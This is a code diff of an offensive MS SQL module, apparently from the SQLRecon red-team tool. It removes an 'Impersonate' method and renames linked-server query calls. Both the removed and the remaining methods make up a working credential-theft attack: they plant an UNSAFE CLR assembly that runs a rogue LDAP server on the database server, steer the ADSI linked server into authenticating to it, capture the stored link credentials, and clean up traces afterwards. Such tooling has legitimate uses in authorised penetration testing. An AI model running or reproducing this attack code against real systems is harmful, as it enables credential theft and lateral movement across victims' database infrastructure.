@@ -115,7 +115,7 @@ namespace SQLRecon.Modules
             }
 
             /* Create a CLR runtime routine based on the randomly generated function name.
-            * 
+            *
             * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
             * as this will execute the query as a block. In MS SQL manager, this command
             * will need to be executed with a GO before it, and a GO after it a
@@ -173,8 +173,8 @@ namespace SQLRecon.Modules
             string queryTwo = "SELECT * FROM ''LDAP://localhost:" + port + "'' ";
 
             // This is not a typo, the query does need to be executed twice in order for the function and assembly to be removed cleanly.
-            _sqlQuery.ExecuteLinkedCustomQuery(conTwo, adsiServer, queryTwo);
-            _sqlQuery.ExecuteLinkedCustomQuery(conTwo, adsiServer, queryTwo);
+            _sqlQuery.ExecuteTunnelCustomQuery(conTwo, adsiServer, queryTwo);
+            _sqlQuery.ExecuteTunnelCustomQuery(conTwo, adsiServer, queryTwo);
 
             // Check to see if the credentials have been obtained.
             if (_print.IsOutputEmpty(sqlOutput).Contains("No Results"))
@@ -193,204 +193,11 @@ namespace SQLRecon.Modules
             _sqlQuery.ExecuteQuery(conTwo, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
         }
 
-        /// <summary>
-        /// The Impersonate method loads a .NET assembly, which executes a local LDAP
-        /// server on a remote SQL server instance using impersonation. 
-        /// The LDAP server is started before an authentication request is 
-        /// sent to it to retrieve stored ADSI credentials.
-        /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords/
-        /// </summary>
-        /// <param name="con"></param>
-        /// <param name="adsiServer"></param>
-        /// <param name="port"></param>
-        /// <param name="impersonate"></param>
-        public void Impersonate(SqlConnection con, string adsiServer, string port, string impersonate = "null")
-        {
-            // First check to see if clr integration is enabled.
-            string sqlOutput = _config.ModuleStatus(con, "clr enabled", impersonate);
-
-            if (!sqlOutput.Contains("1"))
-            {
-                _print.Error("You need to enable CLR (enableclr).", true);
-                // Go no futher.
-                return;
-            }
-
-            // Obtain a list of all linked servers.
-            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate, "SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;");
-
-            // Check to see if the ADSI server exists in the linked server list.
-            if (!sqlOutput.ToLower().Contains(adsiServer.ToLower()))
-            {
-                _print.Error(String.Format("{0} does not exist.", adsiServer), true);
-                // Go no futher.
-                return;
-            }
-
-            string[] dllArr = _ldapServerAssembly();
-            string dllBytes = dllArr[0];
-            string dllHash = dllArr[1];
-
-            if (dllHash.Length != 128)
-            {
-                _print.Error("Unable to calculate hash for DLL.", true);
-                // Go no further.
-                return;
-            }
-
-            // Generate a new random string for the trusted hash path and the CLR function name.
-            string dllPath = _rs.Generate(8);
-            string assem = "ldapServer";
-            string function = _rs.Generate(8);
-
-            // Check to see if the hash already exists.
-            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + "; ");
-
-            if (sqlOutput.Contains("System.Byte[]"))
-            {
-                _print.Status("LDAP server hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-            }
-
-            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
-                "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dllPath +
-                 ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");
-
-            // Verify that the SHA-512 hash has been added.
-            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate,
-                "SELECT * FROM sys.trusted_assemblies;");
-
-            if (sqlOutput.Contains(dllPath))
-            {
-                _print.Success(string.Format("Added SHA-512 hash for LDAP server assembly to sys.trusted_assemblies with a random name of '{0}'.", dllPath), true);
-            }
-            else
-            {
-                _print.Error("Unable to add LDAP server hash to sys.trusted_assemblies.", true);
-                // Go no further.
-                return;
-            }
-
-            // Drop the procedure name, which is the same as the function name if it exists already.
-            // Drop the assembly name if it exists already.
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
-
-            _print.Status(string.Format("Creating a new LDAP server assembly with the name '{0}'.", assem), true);
-            _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
-                          "use msdb; CREATE ASSEMBLY " + assem + " AUTHORIZATION [dbo] FROM 0x" + dllBytes +
-                          " WITH PERMISSION_SET = UNSAFE;");
-
-            // Check to see if the custom assembly has been created
-            sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate,
-               "SELECT * FROM sys.assemblies");
-
-            if (sqlOutput.ToLower().Contains(assem.ToLower()))
-            {
-                _print.Success(string.Format("Created a new LDAP server assembly with the name '{0}'.", assem), true);
-            }
-            else
-            {
-                _print.Error(string.Format("Unable to create a new LDAP server assembly. Cleaning up."), true);
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
-                // Go no further.
-                return;
-            }
-
-
-            /* Create a CLR runtime routine based on the randomly generated function name.
-            * 
-            * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
-            * as this will execute the query as a block. In MS SQL manager, this command
-            * will need to be executed with a GO before it, and a GO after it a
-            *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
-            */
-            _print.Status(string.Format("Loading LDAP server assembly into a new CLR runtime routine '{0}'.", function), true);
-
-            try
-            {
-                SqlCommand query = new(
-                    "EXECUTE AS LOGIN = '" + impersonate + "';", con);
-
-                query.ExecuteNonQuery();
-
-                query = new(
-                    "CREATE FUNCTION [dbo]." + function + "(@port int) RETURNS NVARCHAR(MAX) " +
-                    "AS EXTERNAL NAME " + assem + ".[ldapAssembly.LdapSrv].listen;", con);
-
-                query.ExecuteNonQuery();
-            }
-            catch (Exception e)
-            {
-                _print.Error(string.Format("{0}", e), true);
-            }
-
-            // Verify that the LDAP server assembly has been created.
-
-            sqlOutput = _sqlQuery.ExecuteImpersonationCustomQuery(con, impersonate,
-                "SELECT * FROM sys.assembly_modules");
-
-            if (sqlOutput.ToLower().Contains("ldapsrv"))
-            {
-                _print.Success(string.Format("Created '[{0}].[ldapAssembly.LdapSrv].[{1}]'.", assem, function), true);
-            }
-            else
-            {
-                _print.Error("Unable to load LDAP server assembly into custom CLR runtime routine. Cleaning up.", true);
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
-                _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                // Go no futher.
-                return;
-            }
-
-            _print.Status(string.Format("Starting a local LDAP server on port {0}.", port), true);
-
-            /* Start the LDAP server, which will store the credentias in 'sqlOutput'.
-            * This is a long running query that will hang the 'con' connection object until
-            * an LDAP connection has been established.
-            */
-            Task.Run(() =>
-                sqlOutput = _sqlQuery.ExecuteImpersonationQuery(con, impersonate, "SELECT dbo." + function + "(" + port + ");")
-            );
-
-            _print.Status("Executing LDAP solicitation ...", true);
-
-            /* Create a new SQL connection object as we need to have a second
-            *  connection to the database.This is because the first
-            *  connection object ('con') is being used to run the LDAP server.
-            */
-            SqlConnection conTwo = SetAuthenticationType.CreateSqlConnectionObject();
-
-            string queryTwo = "select * from openquery(\"" + adsiServer + "\", 'SELECT * FROM ''LDAP://localhost:" + port + "''')";
-
-            // This is not a typo, the query does need to be executed twice in order for the function and assembly to be removed cleanly.
-            _sqlQuery.ExecuteImpersonationQuery(conTwo, impersonate, queryTwo);
-            _sqlQuery.ExecuteImpersonationQuery(conTwo, impersonate, queryTwo);
-
-            // Check to see if the credentials have been obtained.
-            if (_print.IsOutputEmpty(sqlOutput).Contains("No Results"))
-            {
-                _print.IsOutputEmpty(sqlOutput, true);
-            }
-            else
-            {
-                _print.Success(string.Format("Obtained ADSI link credentials.\n{0}", sqlOutput.Replace("column0", "")), true);
-            }
-
-            // Cleaning up
-            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', function '{1}' and hash from sys.trusted_assembly.", assem, function), true);
-            _sqlQuery.ExecuteImpersonationQuery(conTwo, impersonate, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteImpersonationQuery(conTwo, impersonate, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
-            _sqlQuery.ExecuteImpersonationQuery(conTwo, impersonate, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-        }
 
         /// <summary>
         /// The Linked method loads a .NET assembly, which executes a local LDAP
         /// server on a remote link SQL server instance/
-        /// The LDAP server is started before an authentication request is 
+        /// The LDAP server is started before an authentication request is
         /// sent to it to retrieve stored ADSI credentials. The authentication request is sent
         /// using SQL agent jobs.
         /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords/
@@ -440,23 +247,23 @@ namespace SQLRecon.Modules
             string function = _rs.Generate(8);
 
             // Check to see if the hash already exists.
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
+            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                 "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + ";");
 
             if (sqlOutput.Contains("System.Byte[]"))
             {
                 _print.Status("LDAP server hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer,
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer,
                     "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
             }
 
             // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer,
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer,
                 "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N''" + dllPath +
                     ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil'';");
 
             // Verify that the SHA-512 hash has been added.
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
+            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                 "SELECT * FROM sys.trusted_assemblies;");
 
             if (sqlOutput.Contains(dllPath))
@@ -472,18 +279,18 @@ namespace SQLRecon.Modules
 
             // Drop the procedure name, which is the same as the function name if it exists already.
             // Drop the assembly name if it exists already.
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
 
             // Create a new custom assembly with the randomly generated name.
             _print.Status(string.Format("Creating a new LDAP server assembly with the name '{0}'.", assem), true);
 
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer,
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer,
                 "CREATE ASSEMBLY " + assem + " AUTHORIZATION [dbo] FROM 0x" + dllBytes +
                           " WITH PERMISSION_SET = UNSAFE;");
 
             // Check to see if the custom assembly has been created
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
+            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                 "SELECT * FROM sys.assemblies;");
 
             if (sqlOutput.ToLower().Contains(assem.ToLower()))
@@ -493,14 +300,14 @@ namespace SQLRecon.Modules
             else
             {
                 _print.Error(string.Format("Unable to create a new LDAP server assembly. Cleaning up."), true);
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                 // Go no further.
                 return;
             }
 
             /* Create a CLR runtime routine based on the randomly generated function name.
-             * 
+             *
              * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
              * as this will execute the query as a block. In MS SQL manager, this command
              * will need to be executed with a GO before it, and a GO after it a
@@ -524,7 +331,7 @@ namespace SQLRecon.Modules
             }
 
             // Verify that the LDAP server assembly has been created.
-            sqlOutput = _sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer,
+            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                 "SELECT * FROM sys.assembly_modules");
 
             if (sqlOutput.ToLower().Contains("ldapsrv"))
@@ -534,9 +341,9 @@ namespace SQLRecon.Modules
             else
             {
                 _print.Error("Unable to load LDAP server assembly into custom CLR runtime routine. Cleaning up.", true);
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
-                _sqlQuery.ExecuteLinkedCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
+                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                 // Go no futher.
                 return;
 
@@ -549,7 +356,7 @@ namespace SQLRecon.Modules
             * an LDAP connection has been established.
             */
             Task.Run(() =>
-                sqlOutput = _sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT dbo." + function + "(" + port + ");")
+                sqlOutput = _sqlQuery.ExecuteTunnelQuery(con, linkedSqlServer, "SELECT dbo." + function + "(" + port + ");")
             );
 
             _print.Status("Executing LDAP solicitation using SQL agent jobs...", true);
@@ -561,10 +368,10 @@ namespace SQLRecon.Modules
             SqlConnection conTwo = SetAuthenticationType.CreateSqlConnectionObject();
 
             /* At this point, we can send a SQL query which will send a request to the local LDAP server.
-             * This is tricky as it requires one of two methods: 
-             * - EXECUTE - which requires RPC to be enabled on the secondary link server. 
+             * This is tricky as it requires one of two methods:
+             * - EXECUTE - which requires RPC to be enabled on the secondary link server.
              * - OpenQuery within an OpenQuery - which doesn't work.
-             * 
+             *
              * Based on this, a nice work around is to leverage the SQL agent on the remote linked server
              * to queue up an OpenQuery that we can use to execute on the linked server, against the ADSI server.
              */
@@ -585,9 +392,9 @@ namespace SQLRecon.Modules
 
             // Cleaning up.
             _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', function '{1}' and hash from sys.trusted_assembly.", assem, function), true);
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(conTwo, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(conTwo, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
-            _sqlQuery.ExecuteLinkedCustomQueryRpcExec(conTwo, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(conTwo, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(conTwo, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
+            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(conTwo, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
         }
 
         /// <summary>
